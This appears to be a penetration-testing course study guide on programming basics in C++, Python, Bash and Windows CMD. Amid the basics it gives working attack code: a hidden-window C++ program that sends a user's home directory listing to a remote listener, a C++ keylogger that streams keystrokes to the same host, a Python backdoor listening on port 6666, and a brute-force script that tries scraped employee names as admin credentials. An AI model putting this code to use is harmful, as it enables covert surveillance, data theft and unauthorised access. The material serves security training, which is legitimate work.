# Preliminary Skills & Programming

* [Introduction](2of3-preliminary-skills-and-programming.md#introduction)
* [C++](2of3-preliminary-skills-and-programming.md#c)
  * [Operators](2of3-preliminary-skills-and-programming.md#operators)
  * [Iteration and Conditional Structures](2of3-preliminary-skills-and-programming.md#iteration-and-conditional-structures)
  * [Pointers](2of3-preliminary-skills-and-programming.md#pointers)
  * [Arrays](2of3-preliminary-skills-and-programming.md#arrays)
  * [Functions Study Guide](2of3-preliminary-skills-and-programming.md#functions-study-guide)
  * [Example: Steals user's directory content](2of3-preliminary-skills-and-programming.md#example-steals-users-directory-content)
  * [Example: keylogger that sends any collected information back](2of3-preliminary-skills-and-programming.md#example-keylogger-that-sends-any-collected-information-back)
* [Python](2of3-preliminary-skills-and-programming.md#python)
  * [Basics](2of3-preliminary-skills-and-programming.md#basics)
  * [Lists](2of3-preliminary-skills-and-programming.md#lists)
  * [Dictionaries](2of3-preliminary-skills-and-programming.md#dictionaries)
  * [Network sockets](2of3-preliminary-skills-and-programming.md#network-sockets)
  * [Port Scanner](2of3-preliminary-skills-and-programming.md#port-scanner)
  * [Backdoor](2of3-preliminary-skills-and-programming.md#backdoor)
  * [Example: HTTP verifier](2of3-preliminary-skills-and-programming.md#example-http-verifier)
  * [Example: HTTP, GET request and check status code](2of3-preliminary-skills-and-programming.md#example-http-get-request-and-check-status-code)
  * [Example: Develop a brute-forcing script in Python, that will use employee details as credentials](2of3-preliminary-skills-and-programming.md#example-develop-a-brute-forcing-script-in-python-that-will-use-employee-details-as-credentials)
* [Command Line Scripting \(12 items\)](2of3-preliminary-skills-and-programming.md#command-line-scripting-12-items)
  * [Bash Shell](2of3-preliminary-skills-and-programming.md#bash-shell)
  * [Bash Environment](2of3-preliminary-skills-and-programming.md#bash-environment)
  * [Bash Commands and Programs](2of3-preliminary-skills-and-programming.md#bash-commands-and-programs)
  * [Bash Output Redirectors and Special Characters](2of3-preliminary-skills-and-programming.md#bash-output-redirectors-and-special-characters)
  * [Bash Conditional Statements and Loops](2of3-preliminary-skills-and-programming.md#bash-conditional-statements-and-loops)
  * [Windows Command Line](2of3-preliminary-skills-and-programming.md#windows-command-line)
  * [Windows Environment](2of3-preliminary-skills-and-programming.md#windows-environment)
  * [Windows Commands and Programs](2of3-preliminary-skills-and-programming.md#windows-commands-and-programs)
  * [Windows Output Redirectors and Special Characters](2of3-preliminary-skills-and-programming.md#windows-output-redirectors-and-special-characters)
  * [Windows Conditional Statements and Loops](2of3-preliminary-skills-and-programming.md#windows-conditional-statements-and-loops)

## Introduction

Set of instructions that a computer may follow. It can be used to automate tasks, leaving specific things to be done by a machine instead of a human. Syntax and usage requirements are specific per language, but purpose keeps on being the same.

* Each programming language has its own syntax, which may require some instructions to use certain characters at the end of each statement while in another language this may not be needed.
* Variables might have different types depending on the programming language.
* Functions are normally allowed to be created. These are pieces of code responsible for some repeatable tasks. Might use arguments and return a value.
* Conditional statements are part of a programming language syntax.
* Loops are a set of instructions that need to be executed numerous times.

Level can tell how close these languages are to the hardware.

| Low level | High level |
| :--- | :--- |
| More complicated, more prone to create vulnerabilities | Ease of development |
| Can do anything with them, as they are so closed to the machine | Less flexible |
| Deep understanding is required | Writing custom functionality from scratch can be difficult |
| Assembly | Java, Python |
|  | They can't run on a bare OS, will need some kind of software already running |

| Programming Languages | Scripting Languages |
| :--- | :--- |
| Programming languages require a compiler. | Interpreted |
| A compiler will convert your plain-text program file into something readable by the language environment. | Software environment install on your computer can read a plain-text program file |

## C++

```cpp
/*
    `Hello World` example where we make use of:
    - Comments
    - Directives
    - Namespaces
    - Terminators (;)
    - `main` function + body
*/

#include <iostream>
using namespace std;

int main() {
  cout << "Hello World";

  // system("PAUSE");
  // cin.ignore();

  return 0;  // program has completed its execution without any errors
}
```

Variables can be 'global' or 'local'.

| Variable Type |  |
| :--- | :--- |
| short / short int | short integer \(2 bytes\) |
| int | integer \(4 bytes\) |
| long / long int | long integer \(4 bytes\) |
| bool | boolean \(1 byte\) |
| float | floating point number \(4 bytes\) |
| double | double precision floating point number \(8 bytes\) |
| char | Character \(1 byte\) |

```cpp
// Input / Output

int uservalue;
cout << "The value of variable sum is " << sum << endl;
cin >> uservalue;
```

### Operators

In C++ there are four main classes of operators:

| Operator |  |  |  |
| :--- | :--- | :--- | :--- |
| Relational | `>`, `>=`, `<`, `<=`, `==`, `!=` |  |  |
| Logical | `&&`, \` |  | `,`!\` |
| Bitwise | `&`, \` | `,`^`,`~`,`&gt;&gt;`,`&lt;&lt;\` |  |

* Expressions that use relational or logical operators return 0 or false and 1 for true.
* 0 value converts to false
* non-zero values automatically converts to true

### Iteration and Conditional Structures

* Useful to instruct the program to execute or to repeat a specific operation when some condition is matched.

| Selection | Iteration | Jump |
| :--- | :--- | :--- |
| if | while | break |
| switch | for | continue |
|  | do-while | goto |
|  |  | return |

```cpp
if (expression)
  statement;
else
  statement;
```

```cpp
switch(expression) {
 case constant1:
  statement sequence
  break;
 case constant2:
  statement sequence
  break;
 default
 statement sequence
}
```

```cpp
for(initialization;condition;increment) {
  statement
}

for ( ; ; ) {

}
```

```cpp
while (condition) {
  statement;
}

do {

} while (condition);
```

```cpp
goto label;
...
...
label:
```

### Pointers

* A pointer is a variable that holds a memory address. This address is the location of another object in memory.
* If a variable is a pointer, it must be declared in a different way.
* `type` defines the type of variable the pointer can point to.
* `*` is the complement of `&`. It returns the value located at the address of the following operator.

```cpp
type *name;

x = &y; // places the value in memory pointed by y into x. So if y contains the memory address of another variable, x will have the same of that 3rd variable
```

### Arrays

An array is a collection of variables of the same type, which is accessed by an index. All arrays have 0 as an index of the first element:

```cpp
type var_name[size];

// Iterate

int x[20];
int i;

for (i=0; i<20; i++) {
  x[i] = i;
}
```

### Functions Study Guide

Functions are blocks of statements defined under a name.

```cpp
type function_name(param1, param2, ...){
  statements;
}

// function with "formal" parameters
int sum(int x, int y) {
  int z;
  z = x + y;
  return(z);
}
```

In almost any programming language, there are two ways in which we can pass arguments to a function:

* By value
  * Copies the value of an argument into a parameter. Changes made to the parameter do not affect the argument
  * Code in the function does not alter the arguments used by the caller
  * It's a copy of the value of the argument passed into the function
  * What occurs inside the function has NO EFFECT on the variable provided by the caller
* By reference
  * The address of an argument \(not the value\) is copied into the parameter
  * Inside the function, the address is used to access the actual argument used in the call
  * Changes made to the parameter will affect the argument

```cpp
void swap(int& x, int& y) {
  int temp;
  temp=*x;
  *x=*y;
  *y=temp;
}
```

### Example: Steals user's directory content

Listen for an incoming connection with `nc -lvp 5555`:

```cpp
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>

char* userDirectory()
{
    char* pPath;
    pPath = getenv ("USERPROFILE");
    if (pPath!=NULL)
    {
        return pPath;
    } else {
        perror("");
    }
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("192.168.0.29");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    char* pPath = userDirectory();
    send(server, pPath, sizeof(pPath), 0);

    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir (pPath)) != NULL) {
        while ((ent = readdir (dir)) != NULL) {
        send(server, ent->d_name, sizeof(ent->d_name), 0);
        }
        closedir (dir);
    } else {
        perror ("");
    }
    closesocket(server);
    WSACleanup();
}
```

### Example: keylogger that sends any collected information back

Listen for an incoming connection with `nc -lvp 5555`:

```cpp
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY;

    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("192.168.0.29");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

        while (true) {
        Sleep(10);
        for (int KEY = 0x8; KEY < 0xFF; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767) {
                        char buffer[2];
                        buffer[0] = KEY;
                        send(server, buffer, sizeof(buffer), 0);
            }
        }
}
closesocket(server);
WSACleanup();
}
```

## Python

### Basics

Python is:

* Cross-platform.
* Free.
* Interpreted.
* Usable in conjunction with components written in some other languages.
* Uses whitespace and indentation to determine block structures.
* Python does not use brackets to delimit a block, using indentation instead.
* A delimiter isn't needed \(as ';'\).
* There isn't the need to declare the type of a variable.
* The following is interpreted as **False**: `0`, `False`, `None`, `""`, `[]`. Everything else is considered as `True`.
* Comparison and Logical operators: `<`, `<=`. `==`, `>`, `>=`, `!=`, `is`, `is not`, `in`, `not in`, `And`, `Or`, `Not`.
* There isn't a `switch / case` statement.

Operators:

```text
=, +, -, *, /, // (division, with results in truncation), ** (exponentiation), %
```

You can use:

```python
"allow 'single' quotes"
'allow "double" quotes'
'''contain single and double quotes'''
```

```python
# String manipulation

x = "Hello World!"
print(x[0])       # H
print(x[1])       # e
print(x[-1])      # !
print(x[0:3])     # Hel
print(x[4:])      # o World!
print(x[:])       # Hello World!

# Input/Output

user_input = input("Message ")
print("User's message:", user_input)

# Conditions
if expression:
  statement
else :
  statement

# Loops

while condition:
  statements_block
post_while_statements

for item in sequence
  for_statements
post_for_statements

# Ranges

range(5) # contains values from 0 to 4
range(0,5) # 0, 1, 2, 3, 4
```

### Lists

* Ordered collections of any type of object
* The general form of a list is a comma-separated list of elements, embraced in square brackets
* Lists are mutable, elements can be modified by assignments
* Python implements many functions that can be used to modifyu a list:
  * `append`: append a new element to the target list
  * `extend`: allows to add one list to another
  * `insert`: add a new list element right before a specific index
  * `del`: delete list items or slices, indices are automatically updated
  * `remove`: it does not work with indices, instead it looks for a given value within the list and it removes that element
  * `.pop(i)`: removes the item at the given position
  * `.sort()`: sorts a list \(items must be of the same type\)
  * `.reverse()`: reverses the order of the elments in the list

```python
simple_list = [1, 2, 3, 4, 5]
list = [1, 2, "els", 4, 5, "something, [0,9]]

x = [1, 2, 3, 4, "els", 5, 6]
del x[2]      # [1, 2, 4, "els", 5, 6]
del x[2]      # [1, 2, "els", 5, 6]
del x[2:]     # [1, 2]
x.remove(2)   # [1]
```

### Dictionaries

* Similar to associative arrays
* Mapping objects
* Instead of being indexed by numbers, dictionaries are using _keys_ for indexing elements
* We have some methods:
  * `.values()`: returns all the values stored in the dictionary
  * `.keys()`: returns all the keys stored in the dictionary
  * `.items()`: returns all the keys and values in the dictionary
* We can also check wif an specific item exists using the existing two following methods:
  * `key in dictionary`
  * `get(key, message)`: if the key exists, returns the associated value, otherwise prints the message passed as an parameter

```python
dictionary = {'first': 'one', 'second': 2}
```

```python
# Functions
# - `function_name.__doc__` shows function description
# - each call to a function creates a new local scope as well as the assigned names within a function that are local to that function
# - global variables can ge used within the function, but to do that we need to insert the keyword  `global` followed by the variable name

def function_name(param1, param2, ...):
  """ function documentation """
  function_statements
  return expression


# Modules
#  A module is a file that contains source code

from module_name import object_name1, object_name2, ...
from module_name import *
```

### Network sockets

```python
""" server.py """
""" Binds itself to a specific address and port and will listen for incoming TCP communications """

import socket

SVR_ADDR = input("Type the server IP address: ")
SRV_PORT = input("Type the server port: ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Default family socket, using TCP and the default socket type connection-oriented (SOCK_STREAM)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)

print("Server started! Waiting for connections...")
connection, address = s.accept()                      # 'connection' is the socket object we will use to send and receive data, 'address' contains the client address bound to the socket
print('Client connected with address:', address)
while 1:                                              # maximum number of queued connections
  data = connection.recv(1024)
  if not data: break
  connection.sendall(b'-- Message Received --\n')
  print(data.decode('utf-8'))
connection.close()
```

```bash
nc <server_ip> <port>
```

```python
""" client.py """
import socket

SVR_ADDR = input("Type the server IP address: ")
SRV_PORT = input("Type the server port: ")

my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_sock.connect((SVR_ADDR, SRV_PORT))
print("Connection established")

message = input("Message to send: ")
my_sock.sendall(message.encode())
my_sock.close()
```

### Port Scanner

* Instead of using `connect()` we'll use `connect_ex()`, which returns - if the operation succeeded.
* This script will use the full 3-way handshake.

```python
import socket

target = input('Enter the IP address to scan: ')
portrange = input('Enter the port range to scan (ex 5-200): ')

lowport = int(portrange.split('-')[0])
highport = int(portrange.split('-')[1])

print('Scanning host ', target, 'from port', lowport, 'to port', highport)

for port in range(lowport, highport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  status = s.connect((target, port))
  if (status ==0):
    print('*** Port', port, ' - OPEN ***')
  else:
      print('*** Port', port, ' - Closed ***')
  s.close()
```

### Backdoor

The program simply binds itself to a NIC and a specific port \(6666\) and then waits for the client commands. Depending on the command received, it will return specific information to the client.

```python
import socket, platform, os

SRV_ADDR = ""
SRV_PORT = 6666

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)
connection, address = s.accept()

while 1:
  try:
    data = connection.recv(1024)
  except:continue

    if(data.decode('utf-8') == '1'):
      tosend = platform.platform() + " " + platform.machine()
      connection.sendall(tosend.encode())
    elif(data.decode('utf-8') == '2'):
      data = connection.recv(1024)
      try:
        filelist = os.listdir(data.decode('utf-8'))
        tosend = ""
        for x in filelist:
          tosend += "," + x
      except:
        tosend += "Wrong path"
      connection.sendall(tosend.encode())
    elif(data.decode('utf-8') == '0'):
      connection.close()
    connection, address = s.accept()
```

### Example: HTTP verifier

Build a Python program that, given an IP address/hostname and port, verifies if the remote Web Server has the HTTTP method `OPTIONS` enabled.

If it does, it tries to enumerate all the other HTTP methods allowed.

```python
import http.client

host = input('Host?')
port = input('Port?')

if(port == ""):
  port = 80

try:
  connection = http.client.HTTPConnection(host, port)
  connection.request('OPTIONS', '/')
  response = connection.getresponse()
  print("Enabled methods are: ", response.getheader('allow'))
  connection.close()
except ConnectionRefusedError:
  print("Connection failed")
```

### Example: HTTP, GET request and check status code

```python
import http.client

host = input('Host?')
port = input('Port?')
url = input('URL?')

if(port == ""):
  port = 80

try:
  connection = http.client.HTTPConnection(host, port)
  connection.request('GET', url)
  response = connection.getresponse()
  print("Enabled methods are: ", response.status)
  connection.close()
except ConnectionRefusedError:
  print("Connection failed")
```

### Example: Develop a brute-forcing script in Python, that will use employee details as credentials

```python
import requests
from bs4 import BeautifulSoup as bs4

def downloadPage(url):
    r = requests.get(url)
    response = r.content
    return response

def findNames(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='name')
    output = []
    for name in names:
        output.append(name.text)
    return output

def findDepts(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='department')
    output = []
    for name in names:
        output.append(name.text)
    return output

def getAuthorized(url, username, password):
    r = requests.get(url, auth=(username, password))
    if str(r.status_code) != '401':
        print "\n[!] Username: " + username + " Password: " + password + " Code: " + str(r.status_code) + "\n"

page = downloadPage("http://172.16.120.120")

names = findNames(page)
uniqNames = sorted(set(names))

depts = findDepts(page)
uniqDepts = sorted(set(depts))

print "[+] Working... "
for name in uniqNames:
    for dept in uniqDepts:
        getAuthorized("http://172.16.120.120/admin.php", name, dept)
```

## Command Line Scripting \(12 items\)

### Bash Shell

* The main non-graphical tool to interact with the operating system is Shell.
* In FreeBSD there is no GUI at all.
* Other notable shells: `ksh`, `zsh`, `dash`.

### Bash Environment

* Upon the start of the shell, the OS checks for the existence of several files as: `~/.bashrc`, `~/.bash_login`, `~/.bash_profile`, `~/.bash_logout`.
* Environment Variables can be viewed by typing `env`.
* `PATH` is a relevant environment variable, which has a format of `[location]:[location]:...:[location]`.
* The `PATH` variable is one of the execution helpers.

### Bash Commands and Programs

* Bash has some built-in commands that provide basic functionality.
* Examples are: `fg`, `echo`, `set`, `while`.
* Most commands that are used in everyday tasks are external mini-programs kept in `PATH` locations \(use `which` to find the real location\).
* `man` displays help about commands.

### Bash Output Redirectors and Special Characters

* `~`: current user's home directory.
* `*`: wildcard that can be used for choosing only certain types of files.
* `$()`: will be evaluated before the whole statement and will become part of this statement.
* Use `command > file.txt` format to create a file containing command's output.
* Use `command >> file.txt` format to append containing command's output to an existing file.
* `|`: pipe.
* chaining commands is a quite powerful Bash feature, one-liners.

```bash
file `ls /etc/*.conf | sort` > test.txt && cat test.txt | wc -l
```

### Bash Conditional Statements and Loops

* `chmod +x scriptname` so you can execute this script with `./scriptname`

```bash
echo '#!/bin/bash' > script.sh
echo 'ls /tmp | wc -l' >> script.sh
chmod +x script.sh
./script.sh
```

```bash
if <conditions>; then
<commands>
fi
```

```bash
if [ x ]; then
  docommand
elif [ y ]; then
  doothercommand
else
  dosomethingelse
fi
```

Conditional statements:

* `-eq`: equal
* `-ne`: not equal
* `-lt`: less than
* `-le`: less than or equal
* `-gt`: greater than
* `-ge`: greater than or equal

Loops:

```bash
#!/bin/bash

for i in $(ls); do
  echo item: $i
done
```

or:

```bash
#!/bin/bash
for i in `seq 1 10`;
do
  echo $i
done
```

While loop:

```bash
while [condition]; do command1; command2; done
```

for example:

```bash
while read line; do echo $line; done < file.txt
```

Filters open ports from nmap output files

```bash
cat *.nmap | grep "open" | grep -v "filtered" | cut -d '/' -f 1 | sort -u | xargs | tr ' ' ',' > ports.txt
```

Fingerprint potential applications:

```bash
cat domains.txt
domain1.com
domain2.com
```

alivecheck.sh:

```bash
#!/bin/bash

for protocol in 'http://' 'https://';do
  while read line;
  do
    code=$(curl -L --write-out "%{http_code}\n" --output /dev/null --silent --insecure $protocol$line)
    if [ $code = "000" ]; then
      echo "$protocol$line: not responding."
    else
      echo "$protocol$line: HTTP $code"
      echo "$protocol$line: $code" >> alive.txt
    fi
  done < domains.txt
done
```

### Windows Command Line

* `cmd.exe` or Windows Command Line is the Microsoft equivalent of the Linux Bash Shell.
* Its usual location is `C:\Windows\system32\cmd.exe`.
* CMD relies mainly on built-in commands.
* Some of the are: `dir`, `cls`, `move` or `del`.

### Windows Environment

In Windows 10: `Control Panel` &gt; `System and Security` &gt; `System` &gt; `Advanced System Settings`.

* There are System variables \(for all users\) and for current user.
* Windows does have a `PATH` variable too, where the executable directories are separated through the `;` symbol.

### Windows Commands and Programs

* Windows CMD supports more built-in commands than the Linux one.
* If you would like to make your newly installed software executable from the command line, syou should place it within any of your `PATH` locations or change the `PATH` variable to contain its location.

### Windows Output Redirectors and Special Characters

* Windows CMD is a less flexible scripting env than Bash.
* PowerShell is better to create advanced scripts in Windows.
* In order to access Windows' env variables: `%varname%`.
* You can print env variables using `echo`, as in: `echo %PATH%`.
* `set` allows you to view variables.
* You can also create your own variables or temporarily modify existing ones.
* Any modifications will not be permanent and will only exist in the current `cmd.exe` window.
* Two different `cmd.exe` windows will not affect each other.
* Output redirection also works in Windows, as in `echo aaa > file.txt` or the append version: `echo bbb >> file.txt`.
* View files with `type` command: `type file.txt`.
* Some ways of command chaining:
  * `command1 & command2`: execute both regardless of the result.
  * `command1 && command2`: execute the 2nd one if the 1st one's execution succeeded.
  * `command1 | command2`: send output from the first command to the second one.
  * `command1 || command2`: execute the 1st command, and if ti fails, execute the second one.

### Windows Conditional Statements and Loops

* `.bat` files allow you to save larger command line scripts

```text
SET x=123
if %x%==123 (echo true) # true
if %x%==xyz (echo true) # nothing is output
if %x%==xyz (echo true) else (echo "does not contain xyz")
```

For loop:

```text
for %i in (*.*) do @echo FILE: %i
```

> `@`: hides the command prompt and just display the output

